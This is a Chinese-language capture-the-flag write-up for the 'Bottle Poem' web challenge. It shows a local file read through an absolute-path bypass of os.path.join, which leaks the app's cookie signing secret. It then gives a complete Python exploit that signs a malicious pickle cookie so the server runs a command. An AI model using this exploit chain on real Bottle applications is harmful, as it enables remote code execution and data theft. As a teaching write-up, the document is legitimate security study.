# Bottle Poem

## 题目简述

题目是一个 Bottle Web 应用：`/show` 根据参数读取诗歌文件，`/sign` 使用带密钥的 Bottle Cookie 保存会话。利用链由两部分组成：

1. `/show` 可通过绝对路径实现本地文件读取，进而泄露源码与 Cookie 签名密钥；
2. 该版本 Bottle 的签名 Cookie 使用 Pickle 反序列化。掌握密钥后可以签出恶意对象，在服务器上执行命令。

容器中的 `/flag` 只有执行权限而没有读权限，因此仅靠文件读取拿不到 flag，必须执行它。

## 解题过程

`/show` 的核心代码如下：

```python
param = request.query.id
if re.search("^../app", param):
    return "No!!!!"

requested_path = os.path.join(os.getcwd() + "/poems", param)
with open(requested_path) as f:
    return f.read()
```

过滤规则只拦截一种以相对路径开头的形式。更关键的是，Python 的 `os.path.join(base, path)` 遇到绝对路径时会丢弃 `base`。因此参数 `/proc/self/cwd/app.py` 会直接解析到当前工作目录下的源码：

```text
/show?id=/proc/self/cwd/app.py
```

同理读取：

```text
/show?id=/proc/self/cwd/config/secret.py
```

可得到签名密钥：

```python
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
```

`/sign` 调用：

```python
session = request.get_cookie("name", secret=sekai)
```

Bottle 的相关实现会先校验 HMAC，再对 Cookie 消息调用 `pickle.loads()`。这个设计问题在 [Bottle issue #900](https://github.com/bottlepy/bottle/issues/900) 中有完整代码说明：签名只能防止未知密钥的篡改；一旦密钥泄露，攻击者便能构造带有 `__reduce__()` 的对象，让反序列化执行任意 Python 可调用对象。

伪装成 `admin` 只会看到 “it’s useless”，不是解题目标。还要结合容器权限：

```dockerfile
COPY flag/flag /flag
RUN chown -R root:root /app /flag && chmod 111 /flag
USER nobody
```

`/flag` 可执行但不可读，所以 LFI 读取它会失败。可以让 Pickle 在反序列化时执行 `/flag`，把输出写到可读的临时文件，再利用同一个 LFI 取回结果，不必依赖反弹 Shell：

```python
import os

import bottle
import requests

BASE = "http://bottle-poem.ctf.sekai.team"
SECRET = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

class Exploit:
    def __reduce__(self):
        command = "/flag > /tmp/bottle-poem-result"
        return os.system, (command,)

# Bottle 的加密 Cookie 内容是 (cookie_name, value)。
cookie = bottle.cookie_encode(("name", Exploit()), SECRET)
if isinstance(cookie, bytes):
    cookie = cookie.decode("ascii")

# 响应可能是 “pls no hax”，但反序列化副作用已经发生。
requests.get(
    f"{BASE}/sign",
    cookies={"name": cookie},
    timeout=10,
)

result = requests.get(
    f"{BASE}/show",
    params={"id": "/tmp/bottle-poem-result"},
    timeout=10,
)
print(result.text)
```

最终得到：

```text
SEKAI{W3lcome_To_Our_Bottle}
```

## 方法总结

这是一条典型的“文件读取扩大为代码执行”链。绝对路径绕过让攻击者读到应用源码和签名密钥；Bottle 又把“通过签名验证的数据”等同于“可以安全反序列化的数据”，最终使泄露的密钥转化为 Pickle RCE。

权限细节决定了最后一步：`chmod 111 /flag` 表示可执行、不可读取，所以不能在 LFI 失败后误判路径错误。执行文件并把标准输出落到临时文件，再由已有读取原语取回，是比依赖外部反弹连接更稳定的闭环。
